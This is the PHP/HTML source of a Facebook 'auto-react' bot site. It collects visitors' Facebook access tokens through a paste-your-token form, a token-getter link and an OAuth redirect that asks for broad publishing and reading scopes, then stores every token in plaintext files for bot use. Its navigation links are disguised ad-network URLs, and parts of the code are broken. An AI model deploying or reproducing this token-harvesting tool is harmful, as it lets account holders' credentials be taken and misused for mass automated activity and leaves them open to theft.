<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>DJBOTTERX</title> <link rel="stylesheet" type="text/css" href="chbotter.css" media="all,handheld"/> <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <div id="snowflakeContainer"> <script type='text/javascript' src='snow.js'></script> <p class="snowflake">*</p></div> 

</style>

<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$Awais[]=$b.'='.$c;
}
	$true='?'.implode('&',$Awais);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY Ayesh user',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('Awais')){

        mkdir('Awais');
}

if($bb){

	$blue=fopen('Awais/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('Awais/'.$id)){

	$file=file_get_contents('Awais/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('Awais/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('Awais/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('Awais/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('Awais/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('Awais/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('Awais/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="container">
<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
<br><font color="white"> Welcome TO AYESH BOT TEAM (JUST LOVE REACT ) Site :</font><font color="BLUE"> '.$nm.' </font></br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" style="height:45px;width:200px;" value="Activate Bot">
</form>
</div>
</div></div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'
<div id="header">
<h1 class="heading">


<center><font color="blue" size="50"><font size="100"<b><script language="JavaScript" src="header.js" size="550"></script></b></font></font><br><center>

<h2 class="description">
<b>

</h2></div>';
} 

public function home(){
echo'<div id="content">
<div class="post">
<div class="post-meta">
<center>
<a target="_blank" href="https://www.facebook.com/100025466832535"><img src="https://graph.facebook.com/100025466832535/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#B22222; padding: 0px;" width="400" height="400" title=""></a>
<br>
<br>
<center><iframe src="https://www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2Fold.is.disable&amp;width=106&amp;height=21&amp;layout=button_count&amp;size=small&amp;show_faces=true&amp;appId" width="106" height="21" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowtransparency="true"></iframe></center>
';
}


public function bwh(){
echo'
<div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Token Area</a></h3> <li><a href="http://scure-token.tk" target="_blank">[ Click Here ]</a> To Get Token </li> </div> </br><div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Admin Area</a></h3> <li><a href="http://wap4dollar.com/ad/nonadult/serve.php?id=cx5av5xnzc" target="_blank">[ Click Here ]</a> Site Admin </li> </div> </br><div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Script Area</a></h3> <li><a href="http://wap4dollar.com/ad/nonadult/serve.php?id=cx5av5xnzc" target="_blank">[ Click Here ]</a> DOWNLOAD SCRIPTS </li> </div> </br> <div id="top-content"> <div id="search-form"> 
<form action="index.php" method="post">

<input class="search" type="text" style="width:65%" name="token" placeholder="Paste Your iphone Token Here" required>

<input class="submit" type="submit" value="Submit"></form></div>';

$this->membEr();
}

public function membEr(){
        if(!is_dir('Awais')){
        mkdir('Awais');
}
$up=opendir('Awais');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
Bot Loverx : <font color="red">'.count($user).'</font> <center> <font color="yellow"> MADE BY :-  <a href="https://www.facebook.com/100013201441761" target="blank"><font color="red">MrDj AyeSh <br></center>
</div>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('Awais/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("Info : Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('Awais/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("Info : Token Invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
